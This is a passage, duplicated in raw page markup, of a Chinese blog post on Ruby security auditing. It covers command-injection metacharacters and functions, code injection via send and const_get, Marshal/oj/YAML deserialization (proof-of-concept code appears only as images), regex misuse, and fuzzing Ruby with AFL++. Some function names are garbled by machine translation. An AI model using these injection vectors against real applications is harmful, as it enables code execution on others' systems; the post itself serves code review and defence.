kramdown模块使用const_get函数来动态实例化格式化类，但是没有限制inherit，导致vakzz通过使用一个Redis类的利用链达到了任意代码执行的目的，漏洞报告已经写的非常详细，不再赘述。</p>\n<h5 id=\"constantize\"><a href=\"#constantize\" class=\"headerlink\" title=\"constantize\"></a><strong>constantize</strong></h5><p>constantize同样可以将字符串转化为类，属于RubyonRails中的用法，底层调用的const_get函数：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small\"\n                       \n                 ></p>\n<p>下图中constantize要转化的类和类实例化的参数都可控，如果我们能找到合适的利用链，便可以到达任意代码执行：</p>\n<h4 id=\"反序列化漏洞\"><a href=\"#反序列化漏洞\" class=\"headerlink\" title=\"反序列化漏洞\"></a><strong>反序列化漏洞</strong></h4><p>反序列化漏洞是指在把外部传入的不可信字节序列恢复为对象的过程中，未做合适校验，导致攻击者可以利用特定方法，配合利用链，达到任意代码执行的目的。Ruby也有反序列化的函数，同样也存在反序列化漏洞。</p>\n<h5 id=\"元帅反序列化\"><a href=\"#元帅反序列化\" class=\"headerlink\" title=\"元帅反序列化\"></a><strong>元帅反序列化</strong></h5><p>Marshal是Ruby用来序列反序列化的模块，Marshal.dump可以把一个对象序列化为字节序，Marshal.load可以把一个字节序反序列化为对象。</p>\n<p>Marshal反序列化的利用已有很多篇分析文章，不再赘述。</p>\n<ul>\n<li>l<a class=\"link\"   href=\"https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\" >https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p>使用已经公开的POC测试：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg\"\n                       \n                 ></p>\n<p>执行POC（ruby-3.0.0）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg\"\n                       \n                 ></p>\n<p>搜索一些不安全的用法：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg\"\n                       \n                 ></p>\n<h5 id=\"JSON反序列化\"><a href=\"#JSON反序列化\" class=\"headerlink\" title=\"JSON反序列化\"></a><strong>JSON反序列化</strong></h5><p>Ruby 处理JSON时可能存在反序列化漏洞，但是不是Ruby内置的JSON解析器，而是第三方开发的解析器oj（<a class=\"link\"   href=\"https://github.com/ohler55/oj%EF%BC%89%E3%80%82oj%E5%9C%A8%E8%A7%A3%E6%9E%90JSON%E6%97%B6%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%8C%85%E6%8B%AC%E4%BC%9A%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84Object%E7%B1%BB%E5%9E%8B%E3%80%82\" >https://github.com/ohler55/oj）。oj在解析JSON时支持多种数据类型，包括会导致代码执行的Object类型。<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>使用已经公开的POC测试：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg\"\n                       \n                 ></p>\n<p>执行POC（ruby-3.0.0）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg\"\n                        alt=\"image.php?url=YD_cnt_38_01EP10d8ODcL\"\n                 ></p>\n<p>oj可以通过设置模式，避免反序列化对象：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"YAML反序列化\"><a href=\"#YAML反序列化\" class=\"headerlink\" title=\"YAML反序列化\"></a><strong>YAML反序列化</strong></h5><p>Ruby YAML也支持反序列化对象，pysch 4.0之前版本调用YAML.load函数即可反序列化对象，psych 4.0以后需要调用YAML.unsafe_load才能反序列化对象。使用已经公开的POC测试：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg\"\n                       \n                 ></p>\n<p>执行POC（ruby-3.0.0）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg\"\n                       \n                 >  </p>\n<p>Ruby YAML解析，psych4.0之前可以通过调用save_load函数，避免反序列化对象，psych 4.0之后默认load函数就是安全的（<a class=\"link\"   href=\"https://github.com/ruby/psych/pull/487%EF%BC%89%E3%80%82\" >https://github.com/ruby/psych/pull/487）。<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>搜索unsafe_load的使用，不一定存在漏洞，需要yaml内容可控才有风险：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small\"\n                       \n                 >  </p>\n<h4 id=\"正则错用\"><a href=\"#正则错用\" class=\"headerlink\" title=\"正则错用\"></a><strong>正则错用</strong></h4><p>Ruby正则大体与其他语言一样，只是在个别语法上存在差别，如果没有特别了解研究，按照其他的语言用法套用，就很有可能出现安全问题，例如Ruby在用正则匹配开头和结尾时支持^$的用法，但是支持多行匹配则需要改为\\A\\Z避免换行绕过。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg\"\n                       \n                 >  </p>\n<p>正则错用引发的安全问题：</p>\n<p>搜索相关代码，还是有不少错用的：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg\"\n                       \n                 >  </p>\n<h4 id=\"FUZZ-Ruby解析器\"><a href=\"#FUZZ-Ruby解析器\" class=\"headerlink\" title=\"FUZZ Ruby解析器\"></a><strong>FUZZ Ruby解析器</strong></h4><p>在学习Ruby反序列化时，想要通过Ruby用C语言实现Marshal，对处理不同数据类型做处理，那么可以对他进行一下FUZZ。</p>\n<p>FUZZ使用了AFLplusplus，配置编译Ruby：</p>\n<blockquote>\n<p>.&#x2F;configure CC&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast++ –disable-install-doc –disable-install-rdoc –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;ruby –enable-debug-env</p>\n<p>导出ASAN_OPTIONS&#x3D;“detect_leaks&#x3D;0：abort_on_error&#x3D;1：allow_user_segv_handler&#x3D;0：handle_abort&#x3D;1：符号&#x3D;0”</p>\n<p>AFL_USE_ASAN&#x3D;1</p>\n</blockquote>\n<p>使用AFLplusplus的deferred instrumentation模式，对Ruby源码main.c文件稍作修改：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg\"\n                       \n                 ></p>\n<p>样本生成上，可以选取Ruby自带的测试用例，这样可以快速得到比较全面合法的样本，正好在学习Ruby hook的方案，写了一个简单的hook函数，在rubygems.rb文件中加载，劫持Marshal模块，执行自测的同时即可保存下样本。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg\"\n                       \n                 >  </p>\n<p>想要FUZZ其他模块也可以用同样办法来获取样本。</p>\n<p>经过一段时间的FUZZ，陆陆续续发现了一些漏洞：</p>\n<p>1. CVE-2022-28738 在onig_reg_resize中双自由</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small\"\n                       \n                 >  </p>\n<p>2. CVE-2022-28739 strtod 中的堆缓冲区溢出</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg\"\n                       \n                 >  </p>\n<p>3. 全局缓冲区溢出calc_tm_yday</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg\"\n                       \n                 >  </p>\n<p>4. renumber_by_map中的动态堆栈缓冲区溢出</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg\"\n                       \n                 >  </p>\n<p>5. JSON.parse 拒绝服务</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small\"\n                       \n                 >  </p>\n<p>虽然FUZZ出了一些问题，但是依旧存在很多未解决的问题，比如FUZZ速度、效率、自动化等，未来将继续深入探索研究。</p>\n<p>以上是笔者在ruby中的一些学习研究汇总，如有不恰当之处，敬请斧正，一起交流学习。</p>\n<h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a><strong>参考链接</strong></h3><blockquote>\n<p><a class=\"link\"   href=\"https://hackerone.com/ruby/hacktivity\" >https://hackerone.com/ruby/hacktivity<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bishopfox.com/blog/ruby-vulnerabilities-exploits\" >https://bishopfox.com/blog/ruby-vulnerabilities-exploits<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://zenn.dev/ooooooo/_q/books/rails/_deserialize\" >https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://gavinmiller.io/2016/the-safesty-way-to-constantize/\" >http://gavinmiller.io/2016/the-safesty-way-to-constantize/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\" >https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.elttam.com/blog/ruby-deserialization/\" >https://www.elttam.com/blog/ruby-deserialization/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\" >https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\" >https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"Ruby安全漫谈\"><a href=\"#Ruby安全漫谈\" class=\"headerlink\" title=\"Ruby安全漫谈\"></a>Ruby安全漫谈</h2><p>随着Ruby越来越流行，Ruby相关的安全问题也逐渐暴露，目前，国内专门介绍Ruby安全的文章较少，本文结合笔者所了解的Ruby安全知识点以及挖掘到的Ruby相关漏洞进行描述，希望能给读者在Ruby代码审计上提供帮助。</p>\n<h2 id=\"Ruby简介\"><a href=\"#Ruby简介\" class=\"headerlink\" title=\"Ruby简介\"></a>Ruby简介</h2><p>Ruby是一种面向对象、指令式、函数式、动态的通用编程语言。在20世纪90年代中期由日本电脑科学家松本行弘（Matz）设计并开发。Ruby注重简洁和效率，句法优雅，读起来自然，写起来舒适。</p>\n<h2 id=\"红宝石安全\"><a href=\"#红宝石安全\" class=\"headerlink\" title=\"红宝石安全\"></a><strong>红宝石安全</strong></h2><p>说到Ruby安全不得不提RubyonRails安全，本篇着重关注Ruby本身。Ruby涉及到web安全漏洞几乎囊括其他语言存在的漏洞，例如命令注入漏洞、代码注入漏洞、反序列化漏洞、SQL注入漏洞、XSS漏洞、SSRF漏洞等。但是在具体的漏洞触发上，Ruby又不同于其他语言。</p>\n<h4 id=\"命令注入漏洞\"><a href=\"#命令注入漏洞\" class=\"headerlink\" title=\"命令注入漏洞\"></a><strong>命令注入漏洞</strong></h4><p>命令注入漏洞一般是指把外部数据传入system类的函数执行，导致命令注入漏洞。触发命令注入漏洞的链接符号有很多，再配合单双引号可以组合成更多不同的注入条件，例如（linux）：</p>\n<ul>\n<li>``</li>\n<li>$</li>\n<li>;</li>\n<li>|</li>\n<li>&amp;</li>\n<li>\\n</li>\n</ul>\n<p>在审计代码的时候一般会直接搜索能够执行命令的函数，例如：</p>\n<ul>\n<li>波彭</li>\n<li>生成</li>\n<li>syscall</li>\n<li>系统</li>\n<li>exec</li>\n<li>开盘3.*</li>\n</ul>\n<p>而对于Ruby，除了支持这些函数执行命令，还有一些独特执行命令的方式：</p>\n<ul>\n<li>%x&#x2F;&#x2F;</li>\n<li>``</li>\n<li>打开</li>\n<li>IO.read</li>\n<li>IO.write</li>\n<li>IO.binread</li>\n<li>IO.binwrite</li>\n<li>IO.foreach</li>\n<li>IO.readlines</li>\n</ul>\n<p>%x&#x2F;&#x2F;和’’属于类似system函数，可以把字符串解析为命令：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg\"\n                       \n                 >  </p>\n<p>open是Ruby用来操作文件的函数，但是他也支持执行命令，执行传入一个以中划线开头的字符，后面跟着要执行的命令即可：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg\"\n                       \n                 >  </p>\n<p>除了open函数，IO.read&#x2F;IO.write&#x2F;IO.binread&#x2F;IO.binwrite&#x2F;IO.foreach&#x2F;IO.readlines函数也可以以相同的方式执行命令。</p>\n<p>open函数引发的Ruby安全问题：</p>\n<p>File.read函数引发的Ruby安全问题：</p>\n<p>IO.readlines函数引发的潜在Ruby安全问题，笔者发现，已被忽略：</p>\n<h4 id=\"代码注入漏洞\"><a href=\"#代码注入漏洞\" class=\"headerlink\" title=\"代码注入漏洞\"></a><strong>代码注入漏洞</strong></h4><p>代码注入漏洞一般是由于把外部数据传入eval类函数中执行，导致程序可以执行任意代码。Ruby除了支持eval，还支持class_eval、instance_eval函数执行代码，区别在于执行代码的上下文环境不同。eval函数导致的代码注入问题与其他语言类似，不再赘述。</p>\n<p>Ruby除了eval、class_eval、instance_eval函数，还存在其他可以执行代码的函数：</p>\n<blockquote>\n<p>发送</p>\n<p>__send__</p>\n<p>public_send</p>\n<p>const_get</p>\n<p>constantize</p>\n</blockquote>\n<h5 id=\"send函数\"><a href=\"#send函数\" class=\"headerlink\" title=\"send函数\"></a><strong>send函数</strong></h5><p>send函数是Ruby用来调用符号方法的函数，可以将任何指定的参数传递给它，类似JAVA中的invoke函数，不过它更为灵活，可以接收外部变量，举例：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg\"\n                       \n                 ></p>\n<p>上述代码中，实例k通过send动态调用了hello办法，假如hello字符串来自外部，便可以传入eval，注入恶意代码，举例：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"send-函数\"><a href=\"#send-函数\" class=\"headerlink\" title=\"__send__函数\"></a><strong>__send__函数</strong></h5><p>__send__函数和send函数一样，区别在于当代码有send同名函数时，可以调用__send__。</p>\n<h5 id=\"public-send函数\"><a href=\"#public-send函数\" class=\"headerlink\" title=\"public_send函数\"></a><strong>public_send函数</strong></h5><p>public_send和send函数的区别在于send可以调用私有方法。</p>\n<p>send函数引发的Ruby安全问题：</p>\n<p>搜索一些不安全的用法：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg\"\n                       \n                 ></p>\n<h5 id=\"const-get函数\"><a href=\"#const-get函数\" class=\"headerlink\" title=\"const_get函数\"></a><strong>const_get函数</strong></h5><p>const_get函数是Ruby用来在模块中获取常量值的函数，它存在一个inherit参数，当设置为true时（默认也为true），会递归向祖先模块查找。它还有另外一个用法，就是当字符串是已载入的类名时，会返回这个类（Ruby中，类名也是常量），类似JAVA的forName函数，常用写法是这样：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg\"\n                       \n                 ></p>\n<p>代码中，使用const_get动态实例化了类，使Ruby更为灵活。但是这样的用法如果使用不当，也会出现安全问题，例如这里（rack-proxy模块）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small\"\n                       \n                 ></p>\n<p>如图，perform_request函数在Net：：HTTP模块中搜索HTTP方法类，然后实例化，并传递full_path请求路径参数给new函数，HTTP方法和请求路径都是外部可控的，而且const_get函数没有限制inherit，默认可以递归查找，在整个空间内实例化任意已载入类，并传递一个可控参数。如果找到合适的利用链，完全可以到达任意代码执行。目前，该问题已在GitHub上被发现并修复。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small\"\n                       \n                 ></p>\n<p>实战中已经有人使用此方法实现了代码执行，那就是gitlab的一个漏洞</p>\n<p><a class=\"link\"   href=\"https://hackerone.com/reports/1125425%EF%BC%8C\" >https://hackerone.com/reports/1125425，<i class=\"fas fa-external-link-alt\"></i></a> kramdown模块使用const_get函数来动态实例化格式化类，但是没有限制inherit，导致vakzz通过使用一个Redis类的利用链达到了任意代码执行的目的，漏洞报告已经写的非常详细，不再赘述。</p>\n<h5 id=\"constantize\"><a href=\"#constantize\" class=\"headerlink\" title=\"constantize\"></a><strong>constantize</strong></h5><p>constantize同样可以将字符串转化为类，属于RubyonRails中的用法，底层调用的const_get函数：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small\"\n                       \n                 ></p>\n<p>下图中constantize要转化的类和类实例化的参数都可控，如果我们能找到合适的利用链，便可以到达任意代码执行：</p>\n<h4 id=\"反序列化漏洞\"><a href=\"#反序列化漏洞\" class=\"headerlink\" title=\"反序列化漏洞\"></a><strong>反序列化漏洞</strong></h4><p>反序列化漏洞是指在把外部传入的不可信字节序列恢复为对象的过程中，未做合适校验，导致攻击者可以利用特定方法，配合利用链，达到任意代码执行的目的。Ruby也有反序列化的函数，同样也存在反序列化漏洞。</p>\n<h5 id=\"元帅反序列化\"><a href=\"#元帅反序列化\" class=\"headerlink\" title=\"元帅反序列化\"></a><strong>元帅反序列化</strong></h5><p>Marshal是Ruby用来序列反序列化的模块，Marshal.dump可以把一个对象序列化为字节序，Marshal.load可以把一个字节序反序列化为对象。</p>\n<p>Marshal反序列化的利用已有很多篇分析文章，不再赘述。</p>\n<ul>\n<li>l<a class=\"link\"   href=\"https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\" >https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p>使用已经公开的POC测试：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg\"\n                       \n                 ></p>\n<p>执行POC（ruby-3.0.0）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg\"\n                       \n                 ></p>\n<p>搜索一些不安全的用法：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg\"\n                       \n                 ></p>\n<h5 id=\"JSON反序列化\"><a href=\"#JSON反序列化\" class=\"headerlink\" title=\"JSON反序列化\"></a><strong>JSON反序列化</strong></h5><p>Ruby 处理JSON时可能存在反序列化漏洞，但是不是Ruby内置的JSON解析器，而是第三方开发的解析器oj（<a class=\"link\"   href=\"https://github.com/ohler55/oj%EF%BC%89%E3%80%82oj%E5%9C%A8%E8%A7%A3%E6%9E%90JSON%E6%97%B6%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%8C%85%E6%8B%AC%E4%BC%9A%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84Object%E7%B1%BB%E5%9E%8B%E3%80%82\" >https://github.com/ohler55/oj）。oj在解析JSON时支持多种数据类型，包括会导致代码执行的Object类型。<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>使用已经公开的POC测试：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg\"\n                       \n                 ></p>\n<p>执行POC（ruby-3.0.0）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg\"\n                        alt=\"image.php?url=YD_cnt_38_01EP10d8ODcL\"\n                 ></p>\n<p>oj可以通过设置模式，避免反序列化对象：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"YAML反序列化\"><a href=\"#YAML反序列化\" class=\"headerlink\" title=\"YAML反序列化\"></a><strong>YAML反序列化</strong></h5><p>Ruby YAML也支持反序列化对象，pysch 4.0之前版本调用YAML.load函数即可反序列化对象，psych 4.0以后需要调用YAML.unsafe_load才能反序列化对象。使用已经公开的POC测试：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg\"\n                       \n                 ></p>\n<p>执行POC（ruby-3.0.0）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg\"\n                       \n                 >  </p>\n<p>Ruby YAML解析，psych4.0之前可以通过调用save_load函数，避免反序列化对象，psych 4.0之后默认load函数就是安全的（<a class=\"link\"   href=\"https://github.com/ruby/psych/pull/487%EF%BC%89%E3%80%82\" >https://github.com/ruby/psych/pull/487）。<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>搜索unsafe_load的使用，不一定存在漏洞，需要yaml内容可控才有风险：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small\"\n                       \n                 >  </p>\n<h4 id=\"正则错用\"><a href=\"#正则错用\" class=\"headerlink\" title=\"正则错用\"></a><strong>正则错用</strong></h4><p>Ruby正则大体与其他语言一样，只是在个别语法上存在差别，如果没有特别了解研究，按照其他的语言用法套用，就很有可能出现安全问题，例如Ruby在用正则匹配开头和结尾时支持^$的用法，但是支持多行匹配则需要改为\\A\\Z避免换行绕过。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg\"\n                       \n                 >  </p>\n<p>正则错用引发的安全问题：</p>\n<p>搜索相关代码，还是有不少错用的：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg\"\n                       \n                 >  </p>\n<h4 id=\"FUZZ-Ruby解析器\"><a href=\"#FUZZ-Ruby解析器\" class=\"headerlink\" title=\"FUZZ Ruby解析器\"></a><strong>FUZZ Ruby解析器</strong></h4><p>在学习Ruby反序列化时，想要通过Ruby用C语言实现Marshal，对处理不同数据类型做处理，那么可以对他进行一下FUZZ。</p>\n<p>FUZZ使用了AFLplusplus，配置编译Ruby：</p>\n<blockquote>\n<p>.&#x2F;configure CC&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;&#x2F;opt&#x2F;AFLplusplus&#x2F;afl-clang-fast++ –disable-install-doc –disable-install-rdoc –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;ruby –enable-debug-env</p>\n<p>导出ASAN_OPTIONS&#x3D;“detect_leaks&#x3D;0：abort_on_error&#x3D;1：allow_user_segv_handler&#x3D;0：handle_abort&#x3D;1：符号&#x3D;0”</p>\n<p>AFL_USE_ASAN&#x3D;1</p>\n</blockquote>\n<p>使用AFLplusplus的deferred instrumentation模式，对Ruby源码main.c文件稍作修改：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg\"\n                       \n                 ></p>\n<p>样本生成上，可以选取Ruby自带的测试用例，这样可以快速得到比较全面合法的样本，正好在学习Ruby hook的方案，写了一个简单的hook函数，在rubygems.rb文件中加载，劫持Marshal模块，执行自测的同时即可保存下样本。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg\"\n                       \n                 >  </p>\n<p>想要FUZZ其他模块也可以用同样办法来获取样本。</p>\n<p>经过一段时间的FUZZ，陆陆续续发现了一些漏洞：</p>\n<p>1. CVE-2022-28738 在onig_reg_resize中双自由</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small\"\n                       \n                 >  </p>\n<p>2. CVE-2022-28739 strtod 中的堆缓冲区溢出</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg\"\n                       \n                 >  </p>\n<p>3. 全局缓冲区溢出calc_tm_yday</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg\"\n                       \n                 >  </p>\n<p>4. renumber_by_map中的动态堆栈缓冲区溢出</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg\"\n                       \n                 >  </p>\n<p>5. JSON.parse 拒绝服务</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small\"\n                       \n                 >  </p>\n<p>虽然FUZZ出了一些问题，但是依旧存在很多未解决的问题，比如FUZZ速度、效率、自动化等，未来将继续深入探索研究。</p>\n<p>以上是笔者在ruby中的一些学习研究汇总，如有不恰当之处，敬请斧正，一起交流学习。</p>\n<h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" 